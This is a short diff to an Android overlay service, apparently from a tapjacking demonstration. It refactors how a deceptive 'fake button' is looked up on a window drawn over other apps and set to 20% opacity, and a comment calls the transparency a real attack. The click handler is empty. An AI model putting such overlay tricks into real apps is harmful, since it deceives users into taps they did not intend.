@@ -45,10 +45,19 @@ public class OverlayService extends Service {
         windowManager.addView(overlayView, params);
 
         // Simulación de botón engañoso
-        Button fakeButton = overlayView.findViewById(R.id.fakeButton);
-        fakeButton.setOnClickListener(v -> {
-            // Acción falsa
-        });
+        int buttonId = getResources().getIdentifier(
+            "fakeButton",
+            "id",
+            getApplicationContext().getPackageName()
+        );
+        
+        Button fakeButton = overlayView.findViewById(buttonId);
+        
+        if (fakeButton != null) {
+            fakeButton.setOnClickListener(v -> {
+                // Acción falsa
+            });
+        }
 
         // Transparencia (ataque real)
         overlayView.setAlpha(0.2f);
